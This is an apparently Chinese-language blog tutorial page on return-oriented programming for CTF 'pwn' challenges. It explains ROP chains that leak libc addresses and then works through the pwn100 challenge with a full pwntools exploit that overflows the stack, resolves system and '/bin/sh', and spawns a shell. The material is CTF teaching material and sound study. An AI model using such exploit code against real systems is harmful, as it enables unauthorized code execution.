@@ -1,0 +1,579 @@
+<!DOCTYPE html><html><head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>ROP技术 | Du4t的博客 | Du4t~~~~</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="PWN">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.4">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	false,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"Du4t","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class>
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/100.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Du4t</h5>
+          <a href="mailto:610109615@qq.com" title="610109615@qq.com" class="mail">
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>1</span>
+            
+              <span>0</span>
+            
+              <span>9</span>
+            
+              <span>6</span>
+            
+              <span>1</span>
+            
+              <span>5</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+        <ul class="menu-link">
+          
+              <li>
+                <a href="https://github.com/Du4t" target="_blank">
+                  <i class="icon icon-lg icon-github"></i>
+                </a>
+              </li>
+            
+        </ul>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class>
+              <a href="/">
+                <i class="icon icon-lg icon-home"></i>
+                HOME
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/categories">
+                <i class="icon icon-lg icon-th-list"></i>
+                CATEGORIES
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/tags">
+                <i class="icon icon-lg icon-tags"></i>
+                TAGS
+              </a>
+            </li>
+        
+            <li class>
+              <a href="/archives">
+                <i class="icon icon-lg icon-archives"></i>
+                ARCHIVES
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>ROP技术</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">ROP技术</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-11-16T08:10:40.000Z" itemprop="datePublished" class="page-time">
+  2019-11-16
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/PWN/">PWN</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left">
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-ROP技术" class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">ROP技术</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-11-16 16:10:40" datetime="2019-11-16T08:10:40.000Z" itemprop="datePublished">2019-11-16</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/PWN/">PWN</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <meta name="generator" content="Hexo 3.9.0"><link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"><blockquote>
+<p>学习ROP技术需要略微一点的plt和got表的知识以及汇编层面函数调用的知识</p>
+</blockquote>
+<h2 id="什么是ROP"><a href="#什么是ROP" class="headerlink" title="什么是ROP"></a>什么是ROP</h2><p>在编程过程中 有面向过程编程(POP) 有面向对象编程(OOP) 而在PWN中 有一种技术叫做面向返回编程 即ROP </p>
+<p>ROP存在的价值就是 当我们不能直接利用返回地址Getshell的时候 我们可以通过一个ROP链 将Getshell时缺少的条件补全 或者拿到一些必要的信息</p>
+<blockquote>
+<p>例如 函数表内没有system 或者 程序内没有/bin/sh 这种尴尬的情况</p>
+</blockquote>
+<h2 id="实现ROP的条件"><a href="#实现ROP的条件" class="headerlink" title="实现ROP的条件"></a>实现ROP的条件</h2><p>ROP对程序执行次数没有要求 因为即使程序仅执行一次 我们依旧可以在ROP链中 将主函数的地址添加进去 让程序返回到主函数处 所以不要求程序执行次数 但是实现ROP最基本的要求就是程序存在栈溢出 即我们能溢出到函数返回地址的位置 </p>
+<h2 id="通常ROP的思路"><a href="#通常ROP的思路" class="headerlink" title="通常ROP的思路"></a>通常ROP的思路</h2><p>通常来说ROP思路基本固定 主要是以下两种</p>
+<p>1.puts_plt+main_addr+puts_got </p>
+<p>(输出puts函数的真实地址 用于泄漏Libc 且最后返回主函数 达成二次利用 [仅适用32位程序] )</p>
+<p>2.pop_rdi_addr+puts_got+puts_plt+main_addr</p>
+<p>(作用同上 但是这个ROP链适用于64位程序)</p>
+<p>其中的函数名是可以换的 直接替换成适合的函数即可</p>
+<h2 id="样例-攻防世界-进阶区-pwn100"><a href="#样例-攻防世界-进阶区-pwn100" class="headerlink" title="样例(攻防世界-进阶区-pwn100)"></a>样例(攻防世界-进阶区-pwn100)</h2><p>首先万年雷同起手式</p>
+<figure class="image-box">
+                <a rel="ROP技术" href="https://ae01.alicdn.com/kf/H565de1b3314e48eca5841b813a4afb464.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H565de1b3314e48eca5841b813a4afb464.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>拖入IDA 发现程序主要的逻辑就是读入200个字符 然后结束 发现在读入时存在栈溢出 程序仅执行一次且程序函数表没有system函数 此时考虑使用ROP</p>
+<figure class="image-box">
+                <a rel="ROP技术" href="https://ae01.alicdn.com/kf/H1fdd1e71e864469287ddbf46bf091747K.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H1fdd1e71e864469287ddbf46bf091747K.png" alt title class></a>
+                <p></p>
+            </figure>
+
+<p>通过观察函数表 发现程序使用过puts函数 决定使用puts函数作为基础 使用ROP技术</p>
+<p>首先因为是64位程序 我们需要将参数puts_got给整到寄存器RDI中 这样才能正常调用 这是我使用的是ROPgadget 这个工具来查找适合的函数 </p>
+<p><a rel="ROP技术" href="https://ae01.alicdn.com/kf/H7408932667ab43bda5577052e025cb3at.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H7408932667ab43bda5577052e025cb3at.png" alt></a></p>
+<p>确定0x400763存在我们需要的函数 那么我们就可以直接构造我们需要的ROP链了</p>
+<blockquote>
+<p>填充字符+pop_rdi_addr+puts_got+puts_plt+main_addr</p>
+</blockquote>
+<p>给出脚本</p>
+<pre class=" language-python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span>
+
+context<span class="token punctuation">.</span>log_level<span class="token operator">=</span><span class="token string">'debug'</span>
+sh<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">"./pwn100"</span><span class="token punctuation">)</span>
+<span class="token comment" spellcheck="true">#sh=remote("111.198.29.45","42072")</span>
+file<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"pwn100"</span><span class="token punctuation">)</span>
+libc<span class="token operator">=</span>ELF<span class="token punctuation">(</span><span class="token string">"./libc6_2.23-0ubuntu10_amd64.so"</span><span class="token punctuation">)</span>
+
+puts_plt<span class="token operator">=</span>file<span class="token punctuation">.</span>plt<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+puts_got<span class="token operator">=</span>file<span class="token punctuation">.</span>got<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+pop_addr<span class="token operator">=</span><span class="token number">0x0000000000400763</span>
+read_addr<span class="token operator">=</span><span class="token number">0x40063D</span>
+
+payload<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>puts_plt<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4006b8</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">"bye~"</span><span class="token punctuation">)</span>
+puts_got<span class="token operator">=</span>u64<span class="token punctuation">(</span>sh<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"puts_got:"</span><span class="token operator">+</span><span class="token string">'0x'</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
+puts_got<span class="token operator">=</span>hex<span class="token punctuation">(</span>puts_got<span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">:</span><span class="token operator">-</span><span class="token number">2</span><span class="token punctuation">]</span>
+puts_got<span class="token operator">=</span>int<span class="token punctuation">(</span>puts_got<span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span>
+libc_base<span class="token operator">=</span>puts_got<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'puts'</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"libc_base:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sys_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sys_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+sh_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>next<span class="token punctuation">(</span><span class="token punctuation">)</span>
+log<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"sh_addr:"</span><span class="token operator">+</span>hex<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token punctuation">)</span>
+
+one_addr<span class="token operator">=</span>libc_base<span class="token operator">+</span><span class="token number">0x45216</span>
+<span class="token comment" spellcheck="true"># gdb.attach(sh)</span>
+<span class="token comment" spellcheck="true"># pause()</span>
+payload2<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x47</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>pop_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sh_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>sys_addr<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4006b8</span><span class="token punctuation">)</span>
+payload3<span class="token operator">=</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x48</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>one_addr<span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">200</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
+sh<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span>
+</code></pre>
+<p>执行即可getshell</p>
+<figure class="image-box">
+                <a rel="ROP技术" href="https://ae01.alicdn.com/kf/H26596ab1eb714c7cb3f943d21e85d677o.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/H26596ab1eb714c7cb3f943d21e85d677o.png" alt title class></a>
+                <p></p>
+            </figure>
+
+
+<h2 id="样例-攻防世界-进阶区-welpwn"><a href="#样例-攻防世界-进阶区-welpwn" class="headerlink" title="样例(攻防世界-进阶区-welpwn)"></a>样例(攻防世界-进阶区-welpwn)</h2><blockquote>
+<p>第一次看见这个标题的时候以为是pwn的入门题..果然被骗了！</p>
+</blockquote>
+<p>老样子 先正常起手式</p>
+<figure class="image-box">
+                <a rel="ROP技术" href="https://ae01.alicdn.com/kf/Hf1a8a25607ca499fae38283b4a04d3dfO.png" title data-fancybox="images"><img src="https://ae01.alicdn.com/kf/Hf1a8a25607ca499fae38283b4a04d3dfO.png" alt title class></a>
+                <p></p>
+            </figure>
+
+
+<p>载入IDA 发现特别迷幻的地方 似乎整个程序都没有洞… 尝试动态调试下吧</p>
+<script>
+        document.querySelectorAll('.github-emoji')
+          .forEach(el => {
+            if (!el.dataset.src) { return; }
+            const img = document.createElement('img');
+            img.style = 'display:none !important;';
+            img.src = el.dataset.src;
+            img.addEventListener('error', () => {
+              img.remove();
+              el.style.color = 'inherit';
+              el.style.backgroundImage = 'none';
+              el.style.background = 'none';
+            });
+            img.addEventListener('load', () => {
+              img.remove();
+            });
+            document.body.appendChild(img);
+          });
+      </script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    最后更新时间：<time datetime="2019-11-16T09:22:02.100Z" itemprop="dateUpdated">2019-11-16 17:22:02</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/11/16/rop-ji-zhu/" target="_blank" rel="external">http://Du4t.github.io/2019/11/16/rop-ji-zhu/</a>
+        
+    </div>
+    <footer>
+        <a href="http://Du4t.github.io">
+            <img src="/img/100.jpg" alt="Du4t">
+            Du4t
+        </a>
+    </footer>
+</blockquote>
+
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/PWN/">PWN</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/11/16/rop-ji-zhu/&title=《ROP技术》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/11/16/rop-ji-zhu/&title=《ROP技术》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/11/01/ru-he-xie-lou-pwn-zhong-de-yi-xie-xin-xi/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">如何泄漏PWN中的一些信息</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#什么是ROP"><span class="post-toc-number">1.</span> <span class="post-toc-text">什么是ROP</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#实现ROP的条件"><span class="post-toc-number">2.</span> <span class="post-toc-text">实现ROP的条件</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#通常ROP的思路"><span class="post-toc-number">3.</span> <span class="post-toc-text">通常ROP的思路</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#样例-攻防世界-进阶区-pwn100"><span class="post-toc-number">4.</span> <span class="post-toc-text">样例(攻防世界-进阶区-pwn100)</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#样例-攻防世界-进阶区-welpwn"><span class="post-toc-number">5.</span> <span class="post-toc-text">样例(攻防世界-进阶区-welpwn)</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </div></div></aside>
+    
+</article>
+
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Du4t © 2019
+            </span>
+        		
+           	
+            
+            
+            <span>
+	            Power by <a href="http://hexo.io/" target="_blank">Hexo</a> Theme <a href="https://github.com/codefine/hexo-theme-mellow" target="_blank">mellow</a>
+            </span>
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://Du4t.github.io/2019/11/16/rop-ji-zhu/&title=《ROP技术》 — Du4t的博客&pic=http://Du4t.github.io/img/100.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://Du4t.github.io/2019/11/16/rop-ji-zhu/&title=《ROP技术》 — Du4t的博客&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACMUlEQVR42u3aS27DMAwFwNz/0inQVYvA7iMlFzA9WhmBI3uyYPjR6xWv9/c6+vzn+rw/v/7cZ/PCwMC4LeN9uj7vOfpuzj7//Jx3SMXAwHgAo7r1+fX5Puc/U3VPDAwMjPPAWmX3eBgYGBhXMK5IEzEwMDCSInbpMa0ge0ktjoGBcUNGdTDwn9cXzjcwMDBuwni31lGyuNJWW3krDAyM2YzqoYeckZS+1R/oj6CMgYHxAEbysPxV8u8mT4wSRwwMjNGM3qtXS9/qDnnox8DAmM2oJn8rDf28iN0wg8XAwBjHqDbX8sNbu0Lwhq4hBgbGCEYSgvNUsjeqrIb46PEYGBg3Z6yXmtWBwUoy+keBjYGBMZpR3aJXjlaL4W3/IRgYGDdnNOcGQVJYbclVm4C/rjEwMEYz8mSumt5VC+C8rG1W5BgYGIMY+fGv3jihlzKWT4hgYGCMY1S36J04S36glfsxMDCewOi1zKrjgZWydmmQiYGBcVtGng4mCWI1lewVulGjDQMDYxBj5cs5phfcV4amGBgYkxjVkFpt3PdWXsT+msRiYGAMZVQDbl5qVvfJE0QMDIynMXqhMD9gUQUnjbnomAUGBsYgRvX0Qn6MrNoUW98BAwNjNqN3wCsfRl4XcA+bbhgYGEMZeZDNm2Kvrat5WgQDA+ORjHwk0Ct386CPgYGBUX1knvblQ9BmnY2BgTGUsVLEVl+9GoijSSwGBsZoxt7G/d6WXD4WxcDAGMr4Aifp/vUQWlSzAAAAAElFTkSuQmCC" alt="微信分享二维码">
+</div>
+
+
+    
+    <!-- main-js -->
+<script type="text/javascript" src="//cdn.bootcss.com/jquery/2.1.0/jquery.min.js"></script>
+<script type="text/javascript" src="/js/plugins/fastclick.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/plugins/ios-orientationchange-fix.js?v=1.4.4"></script>
+<script type="text/javascript" src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.js"></script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+
+<script type="text/javascript" src="/js/method.js?v=1.4.4"></script>
+<script type="text/javascript" src="/js/blog.js?v=1.4.4"></script>
+
+<!-- third-party -->
+
+
+
+
+
+
+<script type="text/javascript" src="/js/plugins/local_search.js?v=1.4.4"></script>
+<script type="text/javascript">
+	var search_path = "search.xml";
+	if (search_path.length === 0) {
+		search_path = "search.xml";
+	}
+	var path = "/" + search_path;
+	searchFunc(path, "local-search-input", "local-search-result");
+</script>
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+    
+    
+
+
+
+
+
+    <!-- mathjax config similar to math.stackexchange -->
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Config({
+        tex2jax: {
+            inlineMath: [ ['$','$'], ["\\(","\\)"]  ],
+            processEscapes: true,
+            skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
+        }
+    });
+</script>
+
+<script type="text/x-mathjax-config">
+    MathJax.Hub.Queue(function() {
+        var all = MathJax.Hub.getAllJax(), i;
+        for (i=0; i < all.length; i += 1) {
+            all[i].SourceElement().parentNode.className += ' has-jax';
+        }
+    });
+</script>
+
+<script type="text/javascript" src="//cdn.bootcss.com/mathjax/2.7.1/latest.js?config=TeX-AMS-MML_HTMLorMML"></script>
+
+
+
+
+    <script>
+    (function() {
+        var OriginTitile = document.title, titleTime;
+        document.addEventListener('visibilitychange', function() {
+            if (document.hidden) {
+                document.title = '死鬼去哪里了！';
+                clearTimeout(titleTime);
+            } else {
+                document.title = '(つェ⊂)咦!又好了!';
+                titleTime = setTimeout(function() {
+                    document.title = OriginTitile;
+                },2000);
+            }
+        });
+    })();
+</script>
+
+
+
+
+
+    
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"live2d-widget-model-wanko"},"display":{"position":"right","width":150,"height":300},"mobile":{"show":true},"log":false});</script>
+
+<script type="text/javascript" charset="utf-8" src="/js/lazyload-plugin/lazyload.intersectionObserver.min.js"></script></body></html>
